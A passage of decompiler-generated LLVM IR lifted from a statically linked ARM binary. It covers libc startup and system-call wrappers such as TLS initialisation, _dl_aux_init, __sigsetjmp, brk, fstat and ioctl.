  %v2_116b4 = icmp eq i32 %v3_11670, 0
  br i1 %v2_116b4, label %dec_label_pc_116dc, label %bb

dec_label_pc_11698:                               ; preds = %dec_label_pc_11660
  %v1_11698 = add i32 %v0_1167866, 32
  store i32 %v1_11698, i32* %r1.global-to-local, align 4
  %v2_1169c = load i32, i32* %v1_1169c, align 4
  %v4_116a0 = mul i32 %v2_1169c, 32
  %v5_116a0 = add i32 %v4_116a0, %v2_11638
  store i32 %v5_116a0, i32* %r3.global-to-local, align 4
  %v3_116a4 = icmp ult i32 %v1_11698, %v5_116a0
  br i1 %v3_116a4, label %dec_label_pc_11660, label %dec_label_pc_1169c.dec_label_pc_11810.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_1166c
  %v2_116b8 = add i32 %v3_11670, -1
  br label %dec_label_pc_116e0

dec_label_pc_116dc:                               ; preds = %dec_label_pc_1166c, %dec_label_pc_11810
  %v0_116f0.pre = phi i32 [ %v0_116f0.pre.pre, %dec_label_pc_11810 ], [ ptrtoint (i32* @global_var_22290.79 to i32), %dec_label_pc_1166c ]
  %v1_116e0.pre = phi i32 [ %v1_116e0.pre.pre, %dec_label_pc_11810 ], [ %v0_11644, %dec_label_pc_1166c ]
  %v1_1170425 = phi i32 [ %v0_11818, %dec_label_pc_11810 ], [ %v0_11648.v3_11670, %dec_label_pc_1166c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_11810 ], [ %v3_1166c, %dec_label_pc_1166c ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_11810 ], [ %v3_11678, %dec_label_pc_1166c ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_11810 ], [ %v3_1167c, %dec_label_pc_1166c ]
  br label %dec_label_pc_116e0

dec_label_pc_116e0:                               ; preds = %bb, %dec_label_pc_116dc
  %storemerge80 = phi i32 [ %v2_116b8, %bb ], [ 0, %dec_label_pc_116dc ]
  %v0_116e0 = phi i32 [ %v2_116b8, %bb ], [ 0, %dec_label_pc_116dc ]
  %storemerge = phi i32 [ %v3_11670, %bb ], [ 1, %dec_label_pc_116dc ]
  %storemerge79 = phi i32 [ %v3_11670, %bb ], [ 1, %dec_label_pc_116dc ]
  %v0_116f0 = phi i32 [ ptrtoint (i32* @global_var_22290.79 to i32), %bb ], [ %v0_116f0.pre, %dec_label_pc_116dc ]
  %v1_116e0 = phi i32 [ %v0_11644, %bb ], [ %v1_116e0.pre, %dec_label_pc_116dc ]
  %v1_11704 = phi i32 [ %v0_11648.v3_11670, %bb ], [ %v1_1170425, %dec_label_pc_116dc ]
  %stack_var_-52.3 = phi i32 [ %v3_1166c, %bb ], [ %stack_var_-52.0, %dec_label_pc_116dc ]
  %stack_var_-48.3 = phi i32 [ %v3_11678, %bb ], [ %stack_var_-48.0, %dec_label_pc_116dc ]
  %stack_var_-44.3 = phi i32 [ %v3_1167c, %bb ], [ %stack_var_-44.0, %dec_label_pc_116dc ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_116e0 = add i32 %v1_116e0, %v0_116e0
  %v2_116e4 = udiv i32 %v2_116e0, %storemerge
  store i32 %v2_116e4, i32* %r0.global-to-local, align 4
  %v2_116e8 = mul i32 %v2_116e4, %storemerge
  store i32 %v2_116e8, i32* %sb.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_116f0 = add i32 %v0_116f0, 80
  %v3_116f0 = inttoptr i32 %v2_116f0 to i32*
  %v4_116f0 = load i32, i32* %v3_116f0, align 4
  store i32 %v4_116f0, i32* %r3.global-to-local, align 4
  %v1_116f4 = inttoptr i32 %v4_116f0 to i32*
  %v2_116f4 = load i32, i32* %v1_116f4, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_116fc = add i32 %v1_11704, 1168
  %v2_11700 = add i32 %v1_116fc, %stack_var_-52.3
  %v2_11704 = add i32 %v2_11700, %v2_116e8
  %v2_11708 = add i32 %v2_11704, %v2_116f4
  store i32 %v2_11708, i32* %r0.global-to-local, align 4
  %v1_1170c = call i32 @__GI_sbrk(i32 %v2_11708)
  %v1_11710 = load i32, i32* %fp.global-to-local, align 4
  %v1_11718 = sub i32 0, %v1_11710
  store i32 10852, i32* %r4.global-to-local, align 4
  %v2_11710 = add i32 %v1_1170c, 1167
  %v1_11720 = add i32 %v2_11710, %v1_11710
  %v2_11724 = and i32 %v1_11720, %v1_11718
  store i32 %v2_11724, i32* @r5, align 4
  %v1_1172c = load i32, i32* %sl.global-to-local, align 4
  %v3_1172c = add i32 %v1_1172c, 10852
  %v4_1172c = inttoptr i32 %v3_1172c to i32*
  store i32 62, i32* %v4_1172c, align 4
  %v0_11734 = load i32, i32* @r5, align 4
  %v1_11734 = load i32, i32* %sb.global-to-local, align 4
  %v2_11734 = add i32 %v1_11734, %v0_11734
  store i32 %v2_11734, i32* @ip, align 4
  %v0_11738 = load i32, i32* %sl.global-to-local, align 4
  %v1_11738 = load i32, i32* %r4.global-to-local, align 4
  %v2_11738 = add i32 %v1_11738, %v0_11738
  store i32 %v2_11738, i32* %r4.global-to-local, align 4
  %v2_1173c = add i32 %v0_11738, 12140
  store i32 %v2_1173c, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_11734, i32* @r0, align 4
  %v2_11750 = add i32 %v2_11738, 16
  %v3_11750 = inttoptr i32 %v2_11750 to i32*
  store i32 %v2_11734, i32* %v3_11750, align 4
  %v0_11754 = load i32, i32* %sb.global-to-local, align 4
  %v1_11754 = load i32, i32* %r8.global-to-local, align 4
  %v2_11754 = add i32 %v1_11754, 40
  %v3_11754 = inttoptr i32 %v2_11754 to i32*
  store i32 %v0_11754, i32* %v3_11754, align 4
  %v0_11758 = load i32, i32* @r3, align 4
  %v1_11758 = trunc i32 %v0_11758 to i8
  %v2_11758 = load i32, i32* %r4.global-to-local, align 4
  %v3_11758 = add i32 %v2_11758, 20
  %v4_11758 = inttoptr i32 %v3_11758 to i8*
  store i8 %v1_11758, i8* %v4_11758, align 1
  %v0_1175c = load i32, i32* %r4.global-to-local, align 4
  %v1_1175c = add i32 %v0_1175c, 8
  store i32 %v1_1175c, i32* @r4, align 4
  %v0_11760 = call i32 @memcpy()
  %v0_11768 = load i32, i32* @r4, align 4
  %v1_11768 = load i32, i32* @r5, align 4
  %v2_11768 = inttoptr i32 %v1_11768 to i32*
  store i32 %v0_11768, i32* %v2_11768, align 4
  %v0_1176c = load i32, i32* @r5, align 4
  store i32 %v0_1176c, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_1176c, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_c2b4.266 to i32))
  store i32 92, i32* %r3.global-to-local, align 4
  %v0_11780 = load i32, i32* %sl.global-to-local, align 4
  %v2_11780 = add i32 %v0_11780, 92
  %v3_11780 = inttoptr i32 %v2_11780 to i32*
  %v4_11780 = load i32, i32* %v3_11780, align 4
  store i32 %v4_11780, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 11364, i32* %r1.global-to-local, align 4
  %v2_1178c = add i32 %v0_11780, 64
  %v3_1178c = inttoptr i32 %v2_1178c to i32*
  %v4_1178c = load i32, i32* %v3_1178c, align 4
  store i32 %v4_1178c, i32* %r0.global-to-local, align 4
  %v3_11794 = add i32 %v0_11780, 11364
  %v4_11794 = inttoptr i32 %v3_11794 to i32*
  store i32 64, i32* %v4_11794, align 4
  %v1_1179c = load i32, i32* %r8.global-to-local, align 4
  %v2_1179c = add i32 %v1_1179c, 20
  %v3_1179c = inttoptr i32 %v2_1179c to i32*
  store i32 %stack_var_-44.3, i32* %v3_1179c, align 4
  %v1_117a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_117a4 = add i32 %v1_117a4, 24
  %v3_117a4 = inttoptr i32 %v2_117a4 to i32*
  store i32 %stack_var_-48.3, i32* %v3_117a4, align 4
  %v1_117ac = load i32, i32* %r0.global-to-local, align 4
  %v2_117ac = inttoptr i32 %v1_117ac to i32*
  store i32 1, i32* %v2_117ac, align 4
  %v1_117b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_117b4 = add i32 %v1_117b4, 28
  %v3_117b4 = inttoptr i32 %v2_117b4 to i32*
  store i32 %stack_var_-52.3, i32* %v3_117b4, align 4
  %v0_117bc = load i32, i32* @r6, align 4
  %v2_117bc = icmp eq i32 %v0_117bc, 0
  %v1_117c0 = load i32, i32* %r8.global-to-local, align 4
  %v2_117c0 = add i32 %v1_117c0, 44
  %v3_117c0 = inttoptr i32 %v2_117c0 to i32*
  store i32 1, i32* %v3_117c0, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_117c8 = load i32, i32* %sl.global-to-local, align 4
  %v1_117c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_117c8 = add i32 %v1_117c8, %v0_117c8
  store i32 %v2_117c8, i32* %r2.global-to-local, align 4
  %v1_117cc = load i32, i32* @r6, align 4
  br i1 %v2_117bc, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_116e0
  store i32 %v1_117cc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_117d834 = load i32, i32* %r8.global-to-local, align 4
  %v2_117d835 = add i32 %v1_117d834, 32
  %v3_117d836 = inttoptr i32 %v2_117d835 to i32*
  store i32 %v1_117cc, i32* %v3_117d836, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_116e0
  %v2_117d0 = add i32 %v1_117cc, -1
  store i32 %v2_117d0, i32* %r0.global-to-local, align 4
  %v1_117d8 = load i32, i32* %r8.global-to-local, align 4
  %v2_117d8 = add i32 %v1_117d8, 32
  %v3_117d8 = inttoptr i32 %v2_117d8 to i32*
  store i32 %v1_117cc, i32* %v3_117d8, align 4
  %v1_117dc = load i32, i32* @r6, align 4
  store i32 %v1_117dc, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_117e0 = load i32, i32* %r8.global-to-local, align 4
  %v1_117e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_117e0 = add i32 %v1_117e0, 28
  %v3_117e0 = inttoptr i32 %v2_117e0 to i32*
  store i32 %v0_117e0, i32* %v3_117e0, align 4
  %v0_117e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_117e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_117e4 = inttoptr i32 %v1_117e4 to i32*
  store i32 %v0_117e4, i32* %v2_117e4, align 4
  %v0_117e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_117e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_117e8 = add i32 %v1_117e8, %v0_117e8
  store i32 %v2_117e8, i32* %r0.global-to-local, align 4
  %v1_117ec = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_117bc, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_117f4.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_117f4 = phi i32 [ %v0_117f4.pre, %._crit_edge ], [ %v1_117ec, %bb54 ]
  %v2_117f0 = udiv i32 %v2_117e8, %v1_117ec
  %v2_117f4 = load i32, i32* %sb.global-to-local, align 4
  %v3_117f4 = mul i32 %v2_117f0, %v0_117f4
  %v4_117f4 = add i32 %v2_117f4, %v3_117f4
  store i32 %v4_117f4, i32* @r0, align 4
  %v0_117f8 = load i32, i32* %fp.global-to-local, align 4
  %v2_117f8 = icmp ult i32 %v0_117f8, 16
  %v0_117f8. = select i1 %v2_117f8, i32 16, i32 %v0_117f8
  store i32 %v0_117f8., i32* @r1, align 4
  %v2_11808 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11808, i32* @r4, align 4
  store i32 %v6_11624, i32* @r5, align 4
  store i32 %v15_11624, i32* %r8.global-to-local, align 4
  store i32 %v18_11624, i32* %sb.global-to-local, align 4
  store i32 %v21_11624, i32* %sl.global-to-local, align 4
  store i32 %v24_11624, i32* %fp.global-to-local, align 4
  store i32 %v27_11624, i32* @lr, align 4
  %v0_1180c = call i32 @init_static_tls()
  store i32 %v0_1180c, i32* %r0.global-to-local, align 4
  %v0_11818.pre = load i32, i32* @ip, align 4
  %v1_116e0.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_116f0.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11810

dec_label_pc_1169c.dec_label_pc_11810.loopexit_crit_edge: ; preds = %dec_label_pc_11698
  br label %dec_label_pc_11810.loopexit

dec_label_pc_11810.loopexit:                      ; preds = %dec_label_pc_1169c.dec_label_pc_11810.loopexit_crit_edge, %dec_label_pc_11650
  br label %dec_label_pc_11810

dec_label_pc_11810:                               ; preds = %dec_label_pc_11810.loopexit, %entry, %bb55
  %v0_116f0.pre.pre = phi i32 [ ptrtoint (i32* @global_var_22290.79 to i32), %dec_label_pc_11810.loopexit ], [ ptrtoint (i32* @global_var_22290.79 to i32), %entry ], [ %v0_116f0.pre.pre.pre, %bb55 ]
  %v1_116e0.pre.pre = phi i32 [ %v0_11644, %dec_label_pc_11810.loopexit ], [ %v0_11644, %entry ], [ %v1_116e0.pre.pre.pre, %bb55 ]
  %v0_11818 = phi i32 [ %v0_11648, %dec_label_pc_11810.loopexit ], [ %v0_11648, %entry ], [ %v0_11818.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_11818, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_116dc

; uselistorder directives
  uselistorder i32 %v0_11818, { 1, 0 }
  uselistorder i32 %v1_117cc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11738, { 1, 0 }
  uselistorder i32 %v2_11734, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_11698, { 2, 1, 0 }
  uselistorder i32 %v3_11670, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1167866, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_1169c, { 1, 0 }
  uselistorder i32 %v0_11648, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_11644, { 1, 2, 0, 3 }
  uselistorder i32 %v2_11638, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 0, 13, 14, 15 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 0, 10, 9, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 12, 4, 6, 5, 7, 8, 9, 10, 11, 3, 0, 1, 2 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 11364, { 0, 2, 1 }
  uselistorder i32 -4096, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_11810, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_116e0, { 1, 0 }
  uselistorder label %dec_label_pc_116dc, { 1, 0 }
  uselistorder label %dec_label_pc_11660, { 1, 0 }
}

define i32 @function_11830(i32 %arg1) local_unnamed_addr {
dec_label_pc_11830:
  %v0_11830 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11830, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_11830
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11830, %bb
  %v9_11850 = phi i32 [ %arg1, %dec_label_pc_11830 ], [ 0, %bb ]
  ret i32 %v9_11850

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_1185c = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_1185c
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  %v4_1186c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 164) to i32*), align 4
  %v4_11874 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 112) to i32*), align 4
  store i32 %v4_11874, i32* %r1.global-to-local, align 4
  %v1_11878 = add i32 %arg1, 44
  %v2_11878 = inttoptr i32 %v1_11878 to i32*
  %v3_11878 = load i32, i32* %v2_11878, align 4
  %v1_1187c = add i32 %arg1, 28
  %v2_1187c = inttoptr i32 %v1_1187c to i32*
  %v3_1187c = load i32, i32* %v2_1187c, align 4
  store i32 %v3_1187c, i32* %r2.global-to-local, align 4
  %v2_11880 = inttoptr i32 %v4_1186c to i32*
  store i32 %v3_11878, i32* %v2_11880, align 4
  %v0_11884 = load i32, i32* %r2.global-to-local, align 4
  %v1_11884 = load i32, i32* %r1.global-to-local, align 4
  %v2_11884 = inttoptr i32 %v1_11884 to i32*
  store i32 %v0_11884, i32* %v2_11884, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 164) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_11890(i32 %arg1) local_unnamed_addr {
dec_label_pc_11890:
  %v0_11890 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11890, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11890
  %v2_11890 = load i32, i32* @r4, align 4
  %v5_11890 = udiv i32 %v2_11890, 2
  %v6_11890 = and i32 %v5_11890, %arg1
  %v5_11894 = sub nsw i32 32, %v6_11890
  %v6_11894 = shl i32 %v6_11890, %v5_11894
  %v9_11894 = and i32 %v6_11894, %v6_11890
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11890, %bb
  %v10_11894 = phi i32 [ %arg1, %dec_label_pc_11890 ], [ %v9_11894, %bb ]
  ret i32 %v10_11894

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_118a0 = add i32 %arg1, 40
  store i32 %v1_118a0, i32* %r2.global-to-local, align 4
  %v1_118a4 = inttoptr i32 %v1_118a0 to i32*
  %v2_118a4 = load i32, i32* %v1_118a4, align 4
  store i32 %v2_118a4, i32* %r2.global-to-local, align 4
  %v3_118a4 = add i32 %arg1, 44
  %v4_118a4 = inttoptr i32 %v3_118a4 to i32*
  %v5_118a4 = load i32, i32* %v4_118a4, align 4
  store i32 %v5_118a4, i32* %r3.global-to-local, align 4
  %v0_118a8 = call i32 @__aeabi_read_tp()
  %v1_118ac = inttoptr i32 %v0_118a8 to i32*
  %v2_118ac = load i32, i32* %v1_118ac, align 4
  store i32 %v2_118ac, i32* %r1.global-to-local, align 4
  %v3_118b0 = mul i32 %v5_118a4, 8
  store i32 %v3_118b0, i32* %r3.global-to-local, align 4
  %v1_118b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_118b4 = add i32 %v1_118b4, %v0_118a8
  %v3_118b8 = add i32 %v3_118b0, %v2_118ac
  %v4_118b8 = inttoptr i32 %v3_118b8 to i32*
  store i32 %v2_118b4, i32* %v4_118b8, align 4
  %v0_118bc = load i32, i32* %r3.global-to-local, align 4
  %v1_118bc = load i32, i32* %r1.global-to-local, align 4
  %v2_118bc = add i32 %v1_118bc, %v0_118bc
  store i32 %v2_118bc, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_118c4 = add i32 %v2_118bc, 4
  %v5_118c4 = inttoptr i32 %v4_118c4 to i8*
  store i8 1, i8* %v5_118c4, align 1
  %v0_118c8 = load i32, i32* @r4, align 4
  %v1_118c8 = add i32 %v0_118c8, 20
  store i32 %v1_118c8, i32* %r1.global-to-local, align 4
  %v1_118cc = inttoptr i32 %v1_118c8 to i32*
  %v2_118cc = load i32, i32* %v1_118cc, align 4
  store i32 %v2_118cc, i32* @r1, align 4
  %v3_118cc = add i32 %v0_118c8, 24
  %v4_118cc = inttoptr i32 %v3_118cc to i32*
  %v5_118cc = load i32, i32* %v4_118cc, align 4
  store i32 %v5_118cc, i32* %r2.global-to-local, align 4
  %v5_118d0 = call i32 @__GI_mempcpy(i32 %v2_118b4, i32 %v2_118cc, i32 %v5_118cc, i32 1)
  %v0_118d4 = load i32, i32* @r4, align 4
  %v1_118d4 = add i32 %v0_118d4, 28
  store i32 %v1_118d4, i32* %r3.global-to-local, align 4
  %v1_118d8 = inttoptr i32 %v1_118d4 to i32*
  %v2_118d8 = load i32, i32* %v1_118d8, align 4
  store i32 %v2_118d8, i32* %r2.global-to-local, align 4
  %v3_118d8 = add i32 %v0_118d4, 24
  %v4_118d8 = inttoptr i32 %v3_118d8 to i32*
  %v5_118d8 = load i32, i32* %v4_118d8, align 4
  store i32 %v5_118d8, i32* %r3.global-to-local, align 4
  %v2_118dc = sub i32 %v5_118d8, %v2_118d8
  store i32 %v2_118dc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_118e4 = inttoptr i32 %v5_118d0 to i8*
  %v4_118e4 = call i32 @__GI_memset(i8* %v3_118e4, i32 0, i32 %v2_118dc)
  ret i32 %v4_118e4

; uselistorder directives
  uselistorder i32 %v3_118b0, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_mempcpy, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_11934:
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r2, align 4
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 12192) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_11948 = load i32, i32* @r0, align 4
  %v1_1194c = inttoptr i32 %v0_11948 to i32*
  %v2_1194c = load i32, i32* @r4, align 4
  store i32 %v2_1194c, i32* %v1_1194c, align 4
  %v3_1194c = add i32 %v0_11948, 4
  %v4_1194c = inttoptr i32 %v3_1194c to i32*
  %v5_1194c = load i32, i32* @r5, align 4
  store i32 %v5_1194c, i32* %v4_1194c, align 4
  %v6_1194c = add i32 %v0_11948, 8
  %v7_1194c = inttoptr i32 %v6_1194c to i32*
  %v8_1194c = load i32, i32* @r6, align 4
  store i32 %v8_1194c, i32* %v7_1194c, align 4
  %v9_1194c = add i32 %v0_11948, 12
  %v10_1194c = inttoptr i32 %v9_1194c to i32*
  %v11_1194c = load i32, i32* @r7, align 4
  store i32 %v11_1194c, i32* %v10_1194c, align 4
  %v12_1194c = add i32 %v0_11948, 16
  %v13_1194c = inttoptr i32 %v12_1194c to i32*
  %v14_1194c = load i32, i32* @r8, align 4
  store i32 %v14_1194c, i32* %v13_1194c, align 4
  %v15_1194c = add i32 %v0_11948, 20
  %v16_1194c = inttoptr i32 %v15_1194c to i32*
  %v17_1194c = load i32, i32* @sb, align 4
  store i32 %v17_1194c, i32* %v16_1194c, align 4
  %v18_1194c = add i32 %v0_11948, 24
  %v19_1194c = inttoptr i32 %v18_1194c to i32*
  %v20_1194c = load i32, i32* @sl, align 4
  store i32 %v20_1194c, i32* %v19_1194c, align 4
  %v21_1194c = add i32 %v0_11948, 28
  %v22_1194c = inttoptr i32 %v21_1194c to i32*
  %v23_1194c = load i32, i32* @fp, align 4
  store i32 %v23_1194c, i32* %v22_1194c, align 4
  %v24_1194c = add i32 %v0_11948, 32
  %v25_1194c = inttoptr i32 %v24_1194c to i32*
  %v27_1194c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_1194c, i32* %v25_1194c, align 4
  %v28_1194c = add i32 %v0_11948, 36
  %v29_1194c = inttoptr i32 %v28_1194c to i32*
  %v30_1194c = load i32, i32* @lr, align 4
  store i32 %v30_1194c, i32* %v29_1194c, align 4
  %v0_11950 = call i32 @__sigjmp_save()
  ret i32 %v0_11950

; uselistorder directives
  uselistorder i32 %v0_11948, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_1195c = load i32, i32* @r1, align 4
  store i32 %v0_1195c, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_1196c = load i32, i32* @r0, align 4
  store i32 %v0_1196c, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_1196c, -4095
  br i1 %tmp, label %dec_label_pc_11994, label %dec_label_pc_11978

dec_label_pc_11978:                               ; preds = %entry
  %v0_1197c = call i32 @__aeabi_read_tp()
  %v3_11980 = load i16, i16* @global_var_222f0.75, align 2
  %v4_11980 = sext i16 %v3_11980 to i32
  store i32 %v4_11980, i32* @r3, align 4
  %v0_11984 = load i32, i32* @r2, align 4
  %v1_11984 = sub i32 0, %v0_11984
  store i32 %v1_11984, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_1198c = add i32 %v4_11980, %v0_1197c
  %v4_1198c = inttoptr i32 %v3_1198c to i32*
  store i32 %v1_11984, i32* %v4_1198c, align 4
  br label %dec_label_pc_119a4

dec_label_pc_11994:                               ; preds = %entry
  store i32 %v0_1196c, i32* %r7.global-to-local, align 4
  %v2_11994 = icmp eq i32 %v0_1196c, 0
  br i1 %v2_11994, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11994
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11994, %bb
  call void @__pseudo_cond_branch(i1 %v2_11994, i32 ptrtoint (i32* @global_var_11ba8.439 to i32))
  br label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_11978, %.thread
  %v0_119a4 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_119a4

; uselistorder directives
  uselistorder i32 %v0_1196c, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_119a4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @ioctl() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_119b8 = load i32, i32* @r1, align 4
  %v9_119b8 = load i32, i32* @r3, align 4
  store i32 %v9_119b8, i32* %stack_var_-4, align 4
  %v3_119bc = load i32, i32* @r4, align 4
  store i32 %v3_119bc, i32* %stack_var_-32, align 4
  %v12_119bc = load i32, i32* @r7, align 4
  %v4_119cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13152) to i32*), align 4
  %v2_119d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_119d4, i32* @r3, align 4
  %v2_119d8 = icmp eq i32 %v4_119cc, 0
  %v0_119e0 = load i32, i32* @r0, align 4
  store i32 %v0_119e0, i32* @r4, align 4
  store i32 %v3_119b8, i32* @r5, align 4
  br i1 %v2_119d8, label %dec_label_pc_119f0, label %dec_label_pc_11a28

dec_label_pc_119f0:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_119e0, -4095
  br i1 %tmp, label %dec_label_pc_11a20, label %dec_label_pc_11a08

dec_label_pc_11a08:                               ; preds = %dec_label_pc_119f0
  %v1_11a0c = sub i32 0, %v0_119e0
  %v3_11a10 = load i16, i16* @global_var_222f0.75, align 2
  %v4_11a10 = sext i16 %v3_11a10 to i32
  store i32 %v4_11a10, i32* @r3, align 4
  %v0_11a14 = call i32 @__aeabi_read_tp()
  %v2_11a18 = load i32, i32* @r3, align 4
  %v3_11a18 = add i32 %v2_11a18, %v0_11a14
  %v4_11a18 = inttoptr i32 %v3_11a18 to i32*
  store i32 %v1_11a0c, i32* %v4_11a18, align 4
  br label %dec_label_pc_11a20

dec_label_pc_11a20:                               ; preds = %dec_label_pc_119f0, %dec_label_pc_11a08
  %v0_11a20 = phi i32 [ %v0_119e0, %dec_label_pc_119f0 ], [ -1, %dec_label_pc_11a08 ]
  br label %dec_label_pc_11a74

dec_label_pc_11a28:                               ; preds = %entry
  %v0_11a28 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_11a28, i32* %r6.global-to-local, align 4
  %v0_11a38 = load i32, i32* @r4, align 4
  %tmp15 = icmp ult i32 %v0_11a38, -4095
  br i1 %tmp15, label %dec_label_pc_11a68, label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11a28
  %v1_11a54 = sub i32 0, %v0_11a38
  %v3_11a58 = load i16, i16* @global_var_222f0.75, align 2
  %v4_11a58 = sext i16 %v3_11a58 to i32
  store i32 %v4_11a58, i32* @r3, align 4
  %v0_11a5c = call i32 @__aeabi_read_tp()
  %v2_11a60 = load i32, i32* @r3, align 4
